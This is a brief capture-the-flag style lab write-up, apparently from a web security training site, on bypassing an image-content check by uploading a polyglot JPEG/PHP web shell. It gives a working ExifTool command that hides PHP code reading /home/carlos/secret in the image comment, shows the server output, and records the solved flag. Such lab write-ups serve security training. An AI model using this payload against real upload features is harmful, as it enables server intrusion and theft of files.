Lab: Remote code execution via polyglot web shell upload


 This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 


We need to use ExifTool 

exiftool -Comment="<?php echo 'START ' .file_get_contents('/home/carlos/secret') . ' END';?>" dcadcb65a0d09398fa3cce9d46c55423.jpg -o polyglot.php


and we get ï¿½ï¿½ï¿½ï¿½JFIFï¿½ï¿½KSTART 7bK56ltdNF7EpMLWmgSjtqehfJa0iAE2 ENDï¿½ï¿½C  %# , #&')*)-0-(0%()(ï¿½ï¿½C   


DONE

7bK56ltdNF7EpMLWmgSjtqehfJa0iAE2